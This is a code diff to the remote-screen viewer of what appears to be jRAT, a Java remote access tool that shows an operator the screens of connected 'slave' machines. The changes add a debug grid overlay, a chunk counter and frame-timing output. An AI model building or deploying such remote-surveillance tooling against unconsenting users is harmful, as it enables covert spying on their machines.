@@ -6,6 +6,7 @@ import io.jrat.client.Slave;
 import io.jrat.client.packets.outgoing.Packet12RemoteScreen;
 import io.jrat.client.ui.frames.FrameRemoteScreen;
 
+import java.awt.Color;
 import java.awt.Graphics2D;
 import java.awt.image.BufferedImage;
 import java.io.DataInputStream;
@@ -16,6 +17,8 @@ public class Packet68RemoteScreenComplete extends AbstractIncomingPacket {
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		int mouseX = slave.readInt();
 		int mouseY = slave.readInt();
+		
+		long start = System.currentTimeMillis();
 		
 		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
 		
@@ -29,15 +32,33 @@ public class Packet68RemoteScreenComplete extends AbstractIncomingPacket {
 				imageGraphics.drawImage(buffer, 0, 0, buffer.getWidth(), buffer.getHeight(), null);
 				Cursor.drawCursor(slave.getOS(), imageGraphics, mouseX, mouseY);
 				
+				boolean drawGrid = false;
+				
+				if (drawGrid) {
+					imageGraphics.setColor(Color.red);
+					for (int x = 0; x < frame.getRows(); x++) {
+						for (int y = 0; y < frame.getColumns(); y++) {
+							int chunkWidth = buffer.getWidth() / frame.getColumns();
+							int chunkHeight = buffer.getHeight() / frame.getRows();
+							imageGraphics.drawRect(chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight);
+						}
+					}
+				}
+				
 				frame.drawOverlay(image);
 				frame.setBlockSizeLabel(frame.getTransmitted() / 1024);
+				frame.setChunksLabel(frame.getChunks());
 				Main.debug("Transmitted " + (frame.getTransmitted() / 1024) + " kb in one frame");
 				frame.setTransmitted(0);
 			}
             if (frame.isRunning()) {
                 slave.addToSendQueue(new Packet12RemoteScreen(frame.getImageSize(), frame.getQuality(), frame.getMonitor(), frame.getColumns(), frame.getRows()));
 				frame.setTransmitted(0);
+				frame.setChunks(0);
             }
+            
+            long end = System.currentTimeMillis();
+    		System.out.println("Cycle complete took " + (end - start) + " ms");
 		}
 	}
 
